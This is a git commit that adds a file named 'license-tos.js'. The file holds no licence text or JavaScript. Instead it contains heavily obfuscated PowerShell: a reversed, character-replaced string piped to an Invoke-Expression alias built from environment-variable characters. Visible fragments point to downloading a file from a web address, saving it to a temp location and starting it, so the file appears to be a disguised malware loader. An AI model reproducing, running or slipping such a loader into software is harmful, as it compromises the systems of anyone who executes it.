e135cca601b74f698c65c3a90752043a5096fd4a
Azkic50 <Azkilohj55@gmail.com>
2025-04-08 20:38:28 -0400

    Create license-tos.js

---
+++ license-tos.js
@@ -0,0 +1,22 @@
+  ([rEgEx]::MAtcHES( ")'X'+]43[EmOHSp$+]12[eMoHSp$ ( .|)93]RAhC[]gnIRTS[,)401]RAhC[+47]RAhC[+311]RAhC[((ecaLpeR.)43]RAhC[]gnIRTS[,)58]RAhC[+96]RAhC[+99]RAhC[((ecaLpeR.)'$','Yug'(ecaLpeR.)') )hJqYughJq,hJqXawhJq(ECalPer.)29]raHc[]Gni'+'rTs[,hJqBZ1hJq(ECalPer.)69]raH'+'c[]GnirTs[,hJqtolhJ'+'q(ECalPer.)93]raHc[]GnirTs[,)47]raHc[+221]raHc[+311'+']raHc[((ECalPer.))hJqq+Jzq( hcaerofJzq+Jzq  JzhJ'+'q,hJqJzqi{x2Jzq+JzqAJzhJq,hJq}aTADIDOemJzq+JzqIDOJzq'+'+JzqO'+'Jz'+'q'+'+JzqS{x2A Jzq+Jzq 
+Jzq+Jzq
+Jzq( ( )Jzq'+'XJzq+]43[EMOHspXaw+]12[emOhsPXaw ( . hJq,hJq+JzqEIDOLIDOiFJzq+Jzq{xJzq+Jzq2hJq,hJq      Jz'+'q+Jzq
+JhJq,hJqzq+JzqApELIDOiIDOF{x2Jzq+JzqA Jzq+Jzq)JhJq,hJqJzq+JzqhJq,hJqJzq+JzqAJzq+'+'Jzq'+'CJzq+Jzqft = Jzq+Jzq}Jzq+JzqHTJzq+JzqIDOA'+'IDOPeIDJzq+JzqOJzq+JzqLIJzq+JzqhJq,hJqzq+'+'Jzqd4vnIJzq+JzqZdJzq+Jzq4 fhJq,hJq+JzqhJq,hJq) )43]rahJq,hJq 
+ }JzqhJq,hJq  
+Jzq+Jzq ;}HJzq+Jzq'+'TJ'+'zqhJq,hJqc[]ghJq,hJqc[+001]raHc['+'+25]raHc[(('+'EcaLPEr.)JzqhJq,hJq+Jzq
+Jzq+Jzq;)
+Jzq+Jzq})Zd4hJq,hJqJzqZd4TZd4'+'Jzq+Jzq,Zd4P-Jzq+JzqtseZdJzq+Jzq4 f-Jzq+JzhJq,hJqft(& Jzq+JzqhJq,hJqqd4sZd4,Jzq+JzqZd'+'Jzq+Jzq4//:Zd4,Jzq+JzqZd4hpZd4,ZdJzq+Jzq4etiJzq+JzqsZd4Jzq+Jzqf-Cft}5{}6{}8{}Jzq+Jzq7{Jzq+Jzq}0{}4{}11{}Jzq+Jzq'+'1Jzq+Jzq{}2{}hJq,hJqR-Jzq+JzqekoJzq+JzqZdJzq+'+'Jzq4,ZdJzq+Jzq4tJzq+JzqeJzq+JzqMZdJzq+JzqhJq,hJqJzhJ'+'q,hJqq'+'hJq,hJqzqtJzq+JzqcJzq+JzqejbOmotsuCSP[Jzq+Jzq  
+hJq,hJq'+'J'+'zq+JzqtuJzq+JzqOJzq+'+'Jzq- CftaCft.}i{xhJq,hJqIDOOD'+'{Jzq+Jzqx2Jzq+JzqAhJq,hJqzq+Jzq'+'dJzq+Jzq4Jz'+'q+JzqismZJzq+Jzqd4,ZdJzq+'+'Jzq4b'+'ew.ssal'+'gwZJzq+Jz'+'qd4,ZJzq+JzhJq,hJq   
+{ Jzq+JzqyJzq+JzqrJzq+Jzqt Jzq+Jzq   
+Jzq+Jzq{ )}AtAJzq+JzqIJzq'+'+JzqDJzq+hJq,hJqHc['+']gnIRTS[,)76]rhJq,hJqzqc Jzq+Jzq   
+}Jzq+Jzq hJq,hJqzq'+'DOJzq+Jzqolnw'+'hJq'+',hJqrU- '+'hJq,hJqzq'+'+Jzq4thZ'+'d4,Z'+'d4Jzq+J'+'zqptZJzq+JhJq,hJq Jzq+Jzq  Jzq+Jzq  
+}    hJq,hJqd4ecZd4JzhJq,hJqA JhJq,hJqIJzq+JzqDJzq+JzqOaJzq+JzqPElJzq+JzqiF{x2A )Zd4hJq,hJqi   Jzq+Jzq Jzq+Jzq Jzq+JzqhJq,hJqJ'+'zq+JzqtraJzq+Jzqt'+'SZd4Jzq+Jzq,'+'Jzq+JhJq,hJqzq+Jzq Jzq+Jzq  
+;}EJzq+JzqSLAIDOF{x2AJzq+Jzq = }dAIJzq+JzqDOOIDOlJzq+JzqnwJzq+Jzqo'+'D{x2A   Jzq+Jzq   Jzq+Jzq  
+{ )Jzq+Jzq}HtJhJq,hJqA Jzq+'+'Jzqel'+'iFhJq,hJqq@'+' = JzqhJq,hJqJzq}Jzq+J'+'zq  
+}  hJq,hJ'+'q+Jz'+'q   JhJq,hJqsm.JEKJzq+'+'JzqGLQPJzq+JzqZJzq+Jzqd4,Zd4iZJzq+JzqdJzq+Jzq4Jzq+Jzq,Jzq+JzqZdJzq+Jzq4Jzq+JzqXJzq+JzqZdJzq+Jzq4JzqhJq,hJqd4oJzq+JzqrP-Zd4,'+'ZJzq+JzqdJzq+Jzq4Jzq+JhJq,hJqq+JhJq,hJqzq+Jzq;Cft)b.'+'ix2AJzq+Jzq(x2AmgSPMET:vnex2hJq,h'+'JqJzq+Jzq4Jzq+Jzq,Jzq+JzqZJh'+'Jq,'+'h'+'Jqq+Jzq  '+' 
+;}HT'+'Jzq+JzqhJq,hJq- Cft}Jzq+'+'Jzq1JzhJq,hJqtolJzq,)37]'+'raHc[+86]raHc[+97]'+'raHc[((EcaLPEr'+'.)63]raHc[]gnIRT'+'S[,Jzqx2AJzq(EcaL'+'PEr.)JzqBZ1Jzq,J'+'zqmgSJzq(EcaLPEr.)Jzq  
+
+'+'Jzq+hJq,hJqJzqODemIDOOs{Jzq+Jzqx2A ni }Jzq+hJq,hJq'+'zqhJq,hJ'+'qzqd4Jzq+'+'Jzq,Zd4Jzq+JzqJEKGJzhJq,hJqq+Jzq Jzq+Jz'+'qfJzq+Jzq-'+'CftJzq+Jzq}Jzq+JhJq,hJq( Jzq+Jzq= Jzq+Jzq)Zd4aJzq+JzqZd4Jzq+Jzq({@Jzq+Jzq]Jzq+JhJq,hJqaHc[+201]raHc[+611]ra'+'Hc[((EcaLPEr.)93]raHhJq,hJqq+Jzq{}2{}3Jzq+Jzq{}0{Cft(& Jzq+Jzq JzqhJq,hJq}0{}2{}3{Jzq+JzqChJq,hJq  
+{ hctaJzhJq,hJqq+JzqOJzq+Jzqd{xJzq+Jzq2A( fhJq,hJqF{x2hJq,hJqqXJzq+Jzq/Zd4,Zd4.ZdhJq'+',hJqzqssZd4,ZhJq,hJq2Jzq+JzqA ihJq,hJq3{}9{}Jzq+Jzq01{CJzq+JzqftJz'+'q'+'+JzqhJq,hJqzqZhJq,hJqq+Jzq,ZdJzq+Jzq4LQJ'+'zq+JzqPJzq+JzhJq,hJq4,ZdJzq+Jzq4dohZd4,ZJhJq,hJq+Jzq Jzq+JzqfJzq+Jzq-Jzq+JzqCJzq+Jzqft}1{}2{}0{CftJz'+'q+Jzq( = )Zd4bZdJzq+Jzq4Jzq+Jzq(Jzq+Jzq ;)Zd4onenJzq+JzqoZd4'+',ZdJhJq,hJq)Jzq+JzqZd4ts'+'ehJq,hJqq Cft}2{}0{}1{CJzq+Jz'+'qft(&( fJzq+Jzqi'+'      
+;}'+'EJzq+JzqUIJzq+JzqDOrT{Jzq+Jzq'+'x2Jzq+JzqAJzq+Jzq = }Jzq+JzqDAIJzq+J'+'hJq,hJqzq+JzqZd4htaZJzq+Jzqd4Jzq+Jzq,Jzq+hJq,hJq+JzqapJhJq,hJqzq+Jzq'+'  hJq,hJq(Jzq+JzhJq,hJqnIRTS[,)09]raHhJq'+',hJq+Jzq'+'    Jz'+'q+Jzq Jzq+Jzq Jzq+Jzq
+{ )Jzq+Jzq}Jzq+JzqDJzq+JzqaoIDJzq+JzqOLIJzq+J'+'zqDJzq+JzqONwJzhJq,hJqq+JzqZd4JzhJq,hJqzq1{hJq f- UEc}96{}25{}32{}66{}3{}56{}92'+'{}83{}02{}43{}15{}95{}13'+'{}44{}24{}31{}53{}61{}64{}52{}0{}'+'12{}26{}74{'+'}76{}6{}72{}67{}04{'+'}65{}51{}94{}9{'+'}06{}'+'11{}17{}03{}22{}2'+'{}91{}34{}86{}73{}14{}47{}7'+'{'+'}36'+'{}8{}05{}55{}57{}33{}27{}81{}54{}5{}35{}82{}87{}9'+'7{}85{}46{}37{}63{}01{}84{}62{}1{}21{'+'}71{}23{}45{'+'}16{}41{}42{}75{}4{}93{}07{}'+'77{UEc(( ( )hJqXhJq+]31[dIlleHSYug+]1[D'+'iLLehsYug (. '(" ,'.', 'rIGhTtOLEft')-joIn '') | . ( $eNV:comspec[4,26,25]-JoiN'')
